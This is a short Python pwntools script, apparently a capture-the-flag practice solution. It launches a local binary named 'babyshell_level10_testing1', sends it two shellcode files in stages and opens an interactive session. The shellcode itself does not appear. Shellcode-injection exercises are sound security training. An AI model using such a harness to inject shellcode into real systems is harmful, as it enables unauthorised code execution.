#!/usr/bin/env python3

import pwn
import time

# Create a process
binary = pwn.process('/babyshell_level10_testing1')

# First input
with open("shellcode-raw-1", "rb") as f1:
    binary.sendline(f1.read())

time.sleep(3)

# Second input
with open("shellcode-raw-2", "rb") as f2:
    binary.sendline(f2.read())

binary.interactive()
